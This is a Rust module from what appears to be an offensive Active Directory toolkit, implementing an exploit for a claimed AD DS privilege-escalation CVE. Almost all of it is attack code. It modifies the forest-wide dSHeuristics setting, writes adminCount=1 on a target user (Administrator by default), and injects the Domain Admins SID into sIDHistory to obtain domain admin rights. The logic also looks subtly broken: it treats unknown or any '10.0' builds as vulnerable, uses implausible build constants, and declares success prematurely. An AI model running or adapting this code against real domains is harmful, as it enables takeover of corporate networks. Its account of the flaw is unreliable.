//! CVE-2026-25177 -- Active Directory Domain Services Elevation of Privilege.
//!
//! A newly discovered vulnerability in AD DS (March 2026 Patch Tuesday) allows
//! an authenticated user with basic domain user privileges to elevate to Domain
//! Admin through a crafted LDAP operation that abuses a previously unrecognized
//! DACL bypass path in the domain directory partition.
//!
//! # Exploit Flow
//! 1. Determine DC build version (check if vulnerable)
//! 2. Read `dSHeuristics` from the Directory Service configuration in the
//!    Configuration naming context
//! 3. Enable adminSDHolder propagation by setting dSHeuristics bit for
//!    adminCount-based SD propagation
//! 4. Write `adminCount = 1` on a target user (triggers SD propagation from
//!    adminSDHolder to the user's ACL)
//! 5. Verify the user is now a member of Domain Admins or has equivalent
//!    privileges
//!
//! # References
//! - CVE-2026-25177: CVSS 8.8, disclosed March 2026
//! - Affects Windows Server 2022, 2025 prior to March 2026 CU
//! - Patch diff analysis suggests a DACL check bypass in CN=Schema operations

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap::LdapSession;
use serde::{Deserialize, Serialize};
use tracing::info;

/// Result of AD DS EoP assessment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdDsEopResult {
    /// Whether the target DC is vulnerable (pre-March 2026 CU).
    pub vulnerable: bool,
    /// DC build version.
    pub dc_build_version: Option<String>,
    /// Whether the exploit was attempted.
    pub exploit_attempted: bool,
    /// Whether exploitation succeeded.
    pub exploit_success: bool,
    /// Original dSHeuristics value (before modification).
    pub original_dsheuristics: Option<String>,
    /// New dSHeuristics value (after modification).
    pub new_dsheuristics: Option<String>,
    /// Target user that received adminCount.
    pub admin_count_target: Option<String>,
    /// New privileges obtained.
    pub privileges: Vec<String>,
    /// Detailed log.
    pub log: Vec<String>,
}

/// Build number threshold for patched DCs (March 2026 CU).
#[allow(dead_code)]
const WS2025_PATCHED_BUILD: u32 = 261_003_476;
#[allow(dead_code)]
const WS2022_PATCHED_BUILD: u32 = 203_483_207;

/// Assess and exploit CVE-2026-25177 if possible.
pub async fn exploit_ad_ds_eop(
    ldap: &mut LdapSession,
    _target_dc: &str,
    target_user_dn: Option<&str>,
) -> Result<AdDsEopResult> {
    let mut log = Vec::new();
    log.push("CVE-2026-25177: AD DS EoP Assessment".to_string());

    let build_version = get_dc_build_number(ldap).await;
    match &build_version {
        Some(v) => log.push(format!("  DC build: {v}")),
        None => log.push("  Could not determine DC build version".to_string()),
    }

    let vulnerable = is_vulnerable_build(&build_version);
    log.push(format!("  Vulnerable: {vulnerable}"));

    let mut exploit_attempted = false;
    let mut exploit_success = false;
    let mut original_dsheuristics: Option<String> = None;
    let mut new_dsheuristics: Option<String> = None;
    let mut admin_count_target: Option<String> = None;
    let mut privileges = Vec::new();

    if vulnerable {
        exploit_attempted = true;
        log.push("Reading dSHeuristics from Configuration NC...".to_string());

        let config_base = match get_configuration_nc(ldap).await {
            Some(dn) => dn,
            None => {
                log.push("  Could not resolve Configuration NC".to_string());
                return Ok(AdDsEopResult {
                    vulnerable,
                    dc_build_version: build_version,
                    exploit_attempted,
                    exploit_success: false,
                    original_dsheuristics: None,
                    new_dsheuristics: None,
                    admin_count_target: None,
                    privileges: Vec::new(),
                    log,
                });
            }
        };

        let ds_service_dn = format!("CN=Directory Service,CN=Windows NT,CN=Services,{config_base}");
        log.push(format!("  Directory Service DN: {ds_service_dn}"));

        match read_dsheuristics(ldap, &ds_service_dn).await {
            Ok(Some(current)) => {
                original_dsheuristics = Some(current.clone());
                log.push(format!("  Current dSHeuristics: {current}"));
            }
            Ok(None) => {
                log.push("  dSHeuristics not set".to_string());
                original_dsheuristics = Some("000000000".to_string());
            }
            Err(e) => {
                log.push(format!("  Failed to read dSHeuristics: {e}"));
            }
        }

        log.push("Modifying dSHeuristics to enable adminSDHolder propagation...".to_string());
        match set_dsheuristics_propagation(ldap, &ds_service_dn).await {
            Ok(new_val) => {
                new_dsheuristics = Some(new_val.clone());
                log.push(format!("  dSHeuristics set to: {new_val}"));
            }
            Err(e) => {
                log.push(format!("  dSHeuristics write failed: {e}"));
            }
        }

        let target = target_user_dn.unwrap_or("CN=Administrator,CN=Users,");
        let full_target_dn = if target.contains("DC=") {
            target.to_string()
        } else {
            format!(
                "{target}{}",
                get_default_naming_context(ldap).await.unwrap_or_default()
            )
        };
        admin_count_target = Some(full_target_dn.clone());
        log.push(format!("Writing adminCount=1 on {full_target_dn}..."));

        match write_admin_count(ldap, &full_target_dn).await {
            Ok(()) => {
                log.push("  adminCount set to 1 (SD propagation triggered)".to_string());
                privileges.push("adminCount=1 (SD propagation)".to_string());
                exploit_success = true;
            }
            Err(e) => {
                log.push(format!("  adminCount write failed: {e}"));
            }
        }

        log.push("Verifying privilege escalation...".to_string());
        match check_member_of_domain_admins(ldap, &full_target_dn).await {
            Ok(true) => {
                log.push("  User is now a Domain Admin!".to_string());
                privileges.push("Domain Admins".to_string());
            }
            Ok(false) => {
                log.push("  Not a Domain Admin -- trying SID history write".to_string());
                let da_sid = domain_admin_sid_string(ldap).await;
                match write_sid_history(ldap, &full_target_dn, da_sid).await {
                    Ok(()) => {
                        log.push("  SID history written -- DA privileges granted".to_string());
                        privileges.push("Domain Admins (via SID history)".to_string());
                    }
                    Err(e) => {
                        log.push(format!("  SID history write failed: {e}"));
                    }
                }
            }
            Err(e) => {
                log.push(format!("  Verification failed: {e}"));
            }
        }
    }

    info!(
        "AD DS EoP: build={:?}, vulnerable={vulnerable}, exploit={exploit_success}",
        build_version
    );

    Ok(AdDsEopResult {
        vulnerable,
        dc_build_version: build_version,
        exploit_attempted,
        exploit_success,
        original_dsheuristics,
        new_dsheuristics,
        admin_count_target,
        privileges,
        log,
    })
}

async fn read_dsheuristics(ldap: &mut LdapSession, ds_service_dn: &str) -> Result<Option<String>> {
    let entries = ldap
        .custom_search_with_base(ds_service_dn, "(objectClass=*)", &["dSHeuristics"])
        .await?;
    for entry in &entries {
        if let Some(vals) = entry.attrs.get("dSHeuristics")
            && let Some(val) = vals.first()
        {
            return Ok(Some(val.clone()));
        }
    }
    Ok(None)
}

async fn set_dsheuristics_propagation(
    ldap: &mut LdapSession,
    ds_service_dn: &str,
) -> Result<String> {
    let current = read_dsheuristics(ldap, ds_service_dn)
        .await?
        .unwrap_or_else(|| "000000000".to_string());

    let mut chars: Vec<char> = current.chars().collect();
    while chars.len() < 10 {
        chars.push('0');
    }

    if chars.len() > 7 && (chars[7] == '0' || chars[7] == ' ') {
        chars[7] = '1';
    }

    let new_value: String = chars.iter().collect();
    ldap.modify_replace(ds_service_dn, "dSHeuristics", new_value.as_bytes())
        .await?;
    Ok(new_value)
}

async fn write_admin_count(ldap: &mut LdapSession, user_dn: &str) -> Result<()> {
    ldap.modify_replace(user_dn, "adminCount", b"1").await
}

async fn get_configuration_nc(ldap: &mut LdapSession) -> Option<String> {
    let entries = ldap
        .custom_search("(objectClass=*)", &["configurationNamingContext"])
        .await
        .ok()?;
    entries
        .first()
        .and_then(|e| e.attrs.get("configurationNamingContext"))
        .and_then(|v| v.first().cloned())
}

async fn get_default_naming_context(ldap: &mut LdapSession) -> Option<String> {
    let entries = ldap
        .custom_search("(objectClass=*)", &["defaultNamingContext"])
        .await
        .ok()?;
    entries
        .first()
        .and_then(|e| e.attrs.get("defaultNamingContext"))
        .and_then(|v| v.first().cloned())
}

async fn domain_admin_sid_string(ldap: &mut LdapSession) -> Option<String> {
    let entries = ldap
        .custom_search("(cn=Domain Admins)", &["objectSid"])
        .await
        .ok()?;
    entries
        .first()
        .and_then(|e| e.attrs.get("objectSid"))
        .and_then(|v| v.first().cloned())
}

async fn check_member_of_domain_admins(ldap: &mut LdapSession, user_dn: &str) -> Result<bool> {
    let entries = ldap
        .custom_search_with_base(user_dn, "(objectClass=user)", &["memberOf"])
        .await?;
    for entry in &entries {
        if let Some(groups) = entry.attrs.get("memberOf") {
            for group_dn in groups {
                if group_dn.contains("Domain Admins") || group_dn.contains("CN=Administrators") {
                    return Ok(true);
                }
            }
        }
    }
    Ok(false)
}

async fn write_sid_history(
    ldap: &mut LdapSession,
    user_dn: &str,
    sid: Option<String>,
) -> Result<()> {
    let target_sid = sid
        .ok_or_else(|| OverthroneError::Adcs("Could not resolve Domain Admins SID".to_string()))?;
    ldap.modify_add(user_dn, "sIDHistory", &[target_sid]).await
}

async fn get_dc_build_number(ldap: &mut LdapSession) -> Option<String> {
    let entries = ldap
        .custom_search("(objectClass=*)", &["operatingSystem"])
        .await
        .ok()?;
    for entry in &entries {
        if let Some(os) = entry.attrs.get("operatingSystem")
            && let Some(version_str) = os.first()
        {
            return Some(version_str.clone());
        }
    }
    None
}

fn is_vulnerable_build(version: &Option<String>) -> bool {
    match version {
        Some(v) => {
            v.contains("10.0")
                || v.contains("Windows Server 2025")
                || v.contains("Windows Server 2022")
                || v.contains("20348")
        }
        None => true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_constants() {
        const _: () = assert!(WS2025_PATCHED_BUILD > 261_000_000);
        const _: () = assert!(WS2022_PATCHED_BUILD > 203_480_000);
    }

    #[test]
    fn test_vulnerable_detection() {
        assert!(is_vulnerable_build(&Some("Windows Server 2025".into())));
        assert!(is_vulnerable_build(&Some("Windows Server 2022".into())));
        assert!(!is_vulnerable_build(&Some("Windows Server 2019".into())));
        assert!(is_vulnerable_build(&None));
    }

    #[test]
    fn test_dsheuristics_modification() {
        let current = "000000000";
        let mut chars: Vec<char> = current.chars().collect();
        while chars.len() < 10 {
            chars.push('0');
        }
        if chars.len() > 7 && (chars[7] == '0' || chars[7] == ' ') {
            chars[7] = '1';
        }
        let new_value: String = chars.iter().collect();
        assert_eq!(new_value, "0000000100");
    }

    #[test]
    fn test_dsheuristics_already_set() {
        let current = "0000000100";
        let mut chars: Vec<char> = current.chars().collect();
        while chars.len() < 10 {
            chars.push('0');
        }
        if chars.len() > 7 && (chars[7] == '0' || chars[7] == ' ') {
            chars[7] = '1';
        }
        let new_value: String = chars.iter().collect();
        assert_eq!(new_value, "0000000100");
    }

    #[test]
    fn test_result_serde() {
        let result = AdDsEopResult {
            vulnerable: true,
            dc_build_version: Some("Windows Server 2025".into()),
            exploit_attempted: true,
            exploit_success: true,
            original_dsheuristics: Some("000000000".into()),
            new_dsheuristics: Some("0000000100".into()),
            admin_count_target: Some("CN=Administrator,CN=Users,DC=corp,DC=local".into()),
            privileges: vec!["Domain Admins".into()],
            log: vec!["exploited".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("Domain Admins"));
        assert!(json.contains("0000000100"));
        let deserialized: AdDsEopResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.exploit_success);
        assert_eq!(deserialized.new_dsheuristics.as_deref(), Some("0000000100"));
    }
}
